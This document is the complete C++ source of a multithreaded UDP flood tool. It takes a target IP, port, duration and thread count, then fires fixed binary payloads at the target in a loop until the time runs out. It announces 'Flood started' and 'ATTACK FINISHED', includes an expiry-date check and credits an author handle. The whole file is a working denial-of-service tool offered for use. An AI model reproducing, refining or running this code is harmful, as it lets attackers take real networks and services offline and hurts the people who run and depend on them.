#include <iostream>
#include <vector>
#include <thread>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <unistd.h>
#include <arpa/inet.h>
#include <chrono>

void usage() {
    std::cout << "Usage: ./JHAATU <IP> <PORT> <DURATION> <THREADS>\n";
    exit(1);
}

struct ThreadData {
    std::string ip;
    int port;
    int duration;
    time_t expiration_time;
};

void attack(const ThreadData& data) {
    int sock;
    struct sockaddr_in server_addr;

    const std::vector<std::string> payloads = {
        "\x11\xfd\x5a\x29\xd6\xb2\x24\x09\xdb\x3b\xc8\xca\x6f\x9e\xad\x4a\x11\xa5\xf8\xb4\x5a\x8f\x6f\x50\x17\x85\x73\xa6\xda\x82\x36\x67\xb8\x79\x6a\xe1\xf1\x3c\xef\x3f\xb9\x16\x16\x3e\x57\x72\xca\xe7\xf6\x11\x99\x30\x59\xa1\x6b\xb0\x0b\x14\x39\x70\xcd\xae\x15\x7c\x62\x60\xae\xdb\xa5\x49\x77\x77\xe3\x45\xd5\xa9\xd3\x93\x8f\x00\x36\x06\x4f\x18\xc5\xd0\x95\x4b\x94\x2e\xd4\xd9\x29\xc6\x8f\x57\xfe\x78\x7e\x64\x6a\x46\xd8\x72\x8b\xb5\xe3\x1a\x48\x5d\xfe\xfb\x7c\x32\xe7\x43\xc5\x51\x0f\x55\x8c\xb7\xed\x39\x83\xf1\x05\x7d\xaf\x3b\x44\x98\xef\xde\x7b\x63\xa2\xa7\x7e\xe1\xfd\x96\x0f\x1c\xf6\xea\x7a\xc3\x43\x2c\x42\x94\xa2\x1e\x45\xf0\x2b\x0b\x6c\x69\x91\xd3\x3b\x06\x3d\x8f\x3b\x7e\xb3\x3d\x44\x80\xb6\xae\xdd\xe7\xa4\x2f\xde\x48\x69\x91\x9b\xd5\x54\xa8\xe0\x60\x42\x0a\xc6\x26\xac\x15\x70\x48\x09\xbd\x35\xd5\x54\x79\x66\xe6\xb0\x42\x96\xfe\xbd\x4d\xd3\x64\x49\x69\x92\x72\x54\x73\x93\xff\xb7\x0a\xc5\x8d\xd2\x46\x44\x38\xa2\xa0\xe7\x7f\x52\x80\xa8\xc2\x3e\x39\x93\xfd\x68\x29\x36\x8e\xec\x76\x14\x04\xd0\xc9\xbe\x79\x98\x05\xc2\xcf\x96\xab\xff\xfa\x33\xd7\x31\xf1\x83\xf5\x10\x05\x41\x21\x43\x4b\xdc\xe3\x1a\x73\xb4\x8f\x82\xdb\xa4\x00\x54\x19\xa4\xd0\xdf\x1d\x90\xb3\xb4\xa5\xfa\xcd\x8b\x11\xe2\x7e\xac\x51\x6d\x83\xc8\xef\x47\xcf\xb7\x95\x33\xc4\x90\x63\x1f\xd6\x41\x72\xc5\xb5\xaf\x85\xfc\xfc\x21\x20\xfa\x8b\x68\xf0\x3d\x4e\x70\xe4\x00\x95\xa7\xaa\x09\x2b\x7f\x28\xdd\x3f\x0e\x69\x45\x27\x39\x1d\x00\x81\x1b\xae\x9d\xe2\xd4\x8b\xd2\x15\x30\xa4\x9e\x61\x62\xb7\x11\x64\x32\xf5\xf7\xb0\x96\xe6\x1b\xf8\x46\xcc\xc0\x40\xf1\x50\x4f\x89\x76\xe9\x4c\xf1\x49\xd7\x97\x66\x16\xd3\x7c\x82\xca\x02\x7d\x56\xd6\x96",
        "\x9e\xb9\x9b\x1d\x0f\x31\x5d\x34\x07\xf2\x2c\x8c\x85\xca\x99\x1a\xd3\x1e\xff\x54\x86\xc3\xd3\x74\x09\x0b\x1f\x63\xf7\x52\x17\x7a\x71\xb4\x5c\xdb\x70\xb5\x5b\x9f\xe8\xdc\x8f\x78\x1e\x50\x1f\xac\xde\x6d\xd3\x53\x95\xbb\x9a\x1f\xb2\x75\xb6\x8a\x2f\x66\x3d\x4a\xe1\xab\x12\xcc\x4d\x23\x5e\x34\x1b\x40\x05\x2d\xa8\xdc\x18\x86\xf6\x2d\x9d\x97\x1a\x91\xca\x7d\xc2\x54\xf3\xf8\xf2\x05\x9f\x72\x4b\x18\x77\x27",
        "\xca\x8e\x22\x28\x96\xe1\x88\x7c\x80\x6e\xc8\x82\x10\x20\x03\xc1\xac\x29\x70\x6b\x91\x1b\xa0\x35\x0d\x48\x24\x94\xaf\x37\x8e\xf7\x84\xc7\xcf\x1d\xc3\xf9\xd9\x8a\x6a\x34\x95\x55\xfd\x8d\xd7\x6d\xf0\x23\x10\x26\x2c\x94\xa0\x39\x64\xb1\x08\x36\x63\x9c\x0b\xcf\x57\x30\x99\xd2\x08\x19\xc5\xc6\x0b\x01\x77\x13\xc9\x15\xf6\x7a\x2d\x33\xf5\x7b\x16\x28\xcb\x2c\x63\x2a\xf7\xd7\x08\x6f\xb6\x5d\xc9\x16\x00\x0e\x1f\xc2\x31\x3a\xa3\x5f\x35\x33\xa5\xd2\xb4\x15\x1d\x74\x40\x22\xd3\x25\xb3\xcc\x9a\xb1\xed\xa1\x3a\x27\xd1\x6b\x96\xbb\xd8\xc5\xd7\x81\x55\x36\x7a\xf2\xdc\x72\x44\x8b\x9a\x7b\x10\x36\x22\x12\x68\x07\xd2\x7e\x8b\x73\xb9\x3b\xc1\x7d\xa3\x46\xbe\xf1\x78\x7f\x5f\xda\x01\xa5\x1f\xe3\xfb\x1e\x8a\x3f\xac\xdd\x8e\xd4\x94\xe7\x1b\x61\x6c\xbd\xa7\xdc\xd4\x44\x92\xb0\xae\x18\x6f\xf1\x7d\x33\xef\x15\x1f\xf7\x40\x07\xda\xbc\xc4\x8f\x4c\xf8\x63\x32\x3f\x2e\xd4\xe0\x22\x8a\xcf\x06\xd3\x77\x3d\xb0\x2d\xc5\xa6\xe6\x65\xe4\xff\x12\x80\x0e\x59\xc1\xcf\x71\x4f\x89\x13\x8c\x45\x66\x28\x91\x16\xbb\x21\x9a\x81\xaa\x33\x5b\x5b\xda\xbf\x75\x6b\xf4\x99\xaa\xa3\xf4\x07\xb8\xbb\x96\xe7\x2e\x0a\xa9\x6b\x87\xf4\x54\x29\x13\x58\x19\xfd\x7b\xa2\x01\x88\x7f\x90\xe0\x1d\x92\x00\x2a\xdf\xf6\xc1\x06\x27\xcb\xcb\x7a\x9b\x01\x5f\xcb\x26\xc7\xfc\xa9\xaf\x43\x46\xe9\x1a\x69\x67\x41\xea\xb6\x97\xaf\xf4\x11\x85\xa6\xbb\xf2\xf7\xee\xfc\xc9\x02\x89\x48\xe9\xa5\xcd\xd3\x1c\x95\xb3\x8a\x8a\xe5\xb3\xdf\x66\x72\x4d\xca\x22\x57\xcd\x5a\xfd\x9c\x64\x47\xdc\x4b\x76\xfb\x97\xf2\xf0\xc4\x57\xce\x16\x18\xd9\xa9\xe4\x1d\x23\x2a\xf2\xdf\xa6\xb8\xfd\xf4\x16\xa1\xaa\xb0\x41\x6f\x18\x0e\x61\xe6\xdc\xe1\x2d\xf5\x59\xb6\x9d\xb9\xbe\xbd\x02\x55\x14\xc5\x0b\x68\x23\x9d\xed\x33\x70\x57\xef\x34\xf9\x3a\x35\x2e\xc2\xee\xcb\xe8\x47\x70\x7a\x8d\xaf\xc1\x76\xb7\x57\xf9\xad\xe3\x40\x5e\xd4\xb1\x08\x6c\xb5\x33\x5f\x7d\x5c\x44\x0a\x47\x1b\xe8\xa7\xfb\x85\xd5\x45\xb6\x37\xce\x91\x1a\xce\x77\xbd\x21\x87\xf2\x49\x07\x6e\x8f\xd2\xcb\x0d\x01\x1f\xe7\x02\xaf\xae\xb5\x92\x9c\x9b\x18\xc4\x5e\x78\xd6\xc2\x49\x5f\xe9\x91\x0f\x7a\xd6\x1c\xfc\x4d\x03\x7b\xbb\x18\x46\x48\xe7\xe9\xff\x6f\x5d\x65\xa4\xf9\x3c\xb3\x66\x10\xef\xcb\xf8\xef\x41\xbe\x19\x9a\x49\x1a\x6e\x12\xab\x43\xeb\xdd\x6f\xf8\x4e\xa5\x9c\xbc\x28\x01\x6e\x5a\x5b\x35\xb1\x04\xa3\x17\xfe\xda\x8c\x16\xf3\x27\x1e\x05\xbf\x00\xe0\xee\x1a\x40\xf8\x05\x10\x2d\xfa\x10\xf2\xc1\x36\x8d\xd1\xa1\xd4\x9d\xeb\xd6\xec\x20\x3c\x8d\x69\x7e\x89\xf2\x71\xb6\x23\xf5\x26\x5f\x9f\x7f\xd7\x3a\xe7\x20\x4c\x63\x21\x03\xe4\xff\xc5\xca\xc2\x05\xb8\x1e\x98\xc7\x53\xfd\xe8\x15\xc8\x8b\xb5\x04\xf9\x6f\x3d\x0e\xd1\x42\x4d\x43\xb7\xa6\x70\x80\x08\xba\x8e\x25\xad\x42\x35\xc3\x84\x10\xf0\xbd\x0a\x30\x00\xe4\xd0\xe0\x26\xc0\xd3\xd8\xa3\xbd\x9d\xaa\xda\xee\xb3\x02\x18\xda\x60\x19\xdf\x4c\x18\x5d\x6d\xda\x4b\xa5\x43\xf8\x71\x7f\x2f\x66\x2d\x1a\x33\xdd\xde\x5f\x44\xa7\x20\x44\x8a\x87\x7f\xa3\xf0\x50\x54\x4f\x45\xdd\xf7\x1f\x0c\x6a\x71\x22\x22\x8e\x0c\xc1\xc5\xad\x12\x49\x55\x79\xd8\x77\x02\xaf\x59\x2b\x2c\xd5\xf1\x2a\xfd\x01\x77\xe6\xdd\x56\x24\x03\x26\xb0\xc5\xb3\xf3\x2e\xd7\x73\xf9\x2e\xbb\xca\x9a\x3c\xf8\x0d\x88\xef\xe7\x4e\xb7\xa4\x66\x85\x4a\x58\x33\x56\x04\x45\x47\x37\x5e\xac\xa6\x02\xd6\x16\xce\x8b\x90\x2d\xe5\xd7\xaa\xd1\x97\xa3\x96\x88\x45\x4d\x31\xa7\xbd\xa8\x0c\x48\x5f\x16\x09\x73\xbe\x57\xe4\x60\x20\x16\xa5\x6e\x72\xff\xe8\x10\xf6\x57\xf0\x36\xc8\xc8\xb1\x47\xdc\x04\x9c\x02\x77\x28\x15\xb9\x57\x1e\xb8\x1f\x0b\x4e\x63\xf8\xe4\x93\x49\xce\x8c\x3d\x7f\xa7\xcb\x05\x17\x00\x37\xae\xec\x84\xd9\x3d\x5b\x72\x04\x3e\x53\x85\x83\xb6\xfb\x60\x91\x24\xcf\x0d\x19\xa4\xbc\xb8\xdc\xfd\xc6\x6e\xa6\x9a\xad\xce\x86\x6a\x5c\x65\x1d\x70\x56\x0c\x10\xbe\xe6\xf0\xd8\x12\x9a\x16\x38\xa3\x8c\x6a\xf0\x7d\x99\xa7\x4c\x84\xaf\x63\xe8\x2d\x1a\x63\x9d\x67\x60\xd2\xf7\x34\x7e\x1f\x23\x68\x7f\xfb\x53\x12\x00\xe8\xca\x32\x2c\x55\xdf\x1e\xd7\xa8\xa4\x6c\x69\xd9\xf9\xdd\xf7\xdb\x54\x32\x3c\x87\xc5\xa9\x4a\xf9\x4d\x3c\x99\xae\x7e\xfd\x42\x7b\xf3\x0a\x9a\x0d\x59\x13\x92\x10\x49\xf0\xae\x00\x1d\x07\x9f\xa4\xe7\xb1\x57\x08\xac\xee\x08\x3e\xd9\xff\x11\x0c\x6a\x59\x05\xed\x93\xf1\x26\x88\x8b\x86\x29\x4d\xb2\x5d\xdc\xfd\x33\x80\x3d\xe2\xb3\xe6\xc8\x02\x04\xc4\xfd\x05\x27\x32\xd6\xf8\x71\x1a\x08\xfe\x97\xe2\x68\xac"
    };

    // Create socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        return;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data.port);
    server_addr.sin_addr.s_addr = inet_addr(data.ip.c_str());

    auto end_time = std::chrono::system_clock::now() + std::chrono::seconds(data.duration);

    while (std::chrono::system_clock::now() <= end_time) {
        for (const auto& payload : payloads) {
            if (sendto(sock, payload.c_str(), payload.size(), 0,
                       (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                return;
            }
        }
    }

    close(sock);
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        usage();
    }

    std::string ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int threads = std::stoi(argv[4]);

    ThreadData data{ip, port, duration};

    // Set expiration date
    struct tm expiration_tm = {0};
    expiration_tm.tm_year = 2025 - 1900;
    expiration_tm.tm_mon = 0;
    expiration_tm.tm_mday = 30;
    expiration_tm.tm_hour = 23;
    expiration_tm.tm_min = 59;
    expiration_tm.tm_sec = 59;

    data.expiration_time = mktime(&expiration_tm);

    if (data.expiration_time == -1) {
        perror("Error setting expiration time");
        exit(1);
    }

    if (std::time(nullptr) >= data.expiration_time) {
        std::cout << "Attack has expired. Exiting.\n";
        return 0;
    }

    std::cout << "Flood started on " << ip << ":" << port
              << " for " << duration << " seconds with " << threads << " threads\n";

    std::vector<std::thread> thread_pool;

    for (int i = 0; i < threads; ++i) {
        try {
            thread_pool.emplace_back(attack, data);
            std::cout << "Launched thread " << i + 1 << "\n";
        } catch (const std::system_error& e) {
            std::cerr << "Thread creation failed: " << e.what() << "\n";
            return 1;
        }
    }

    for (auto& thread : thread_pool) {
        if (thread.joinable()) {
            thread.join();
        }
    }

    std::cout << "ðŸ”ºATTACK FINISHEDðŸ”»mad by @GodXaloneboy\n";
    return 0;
}
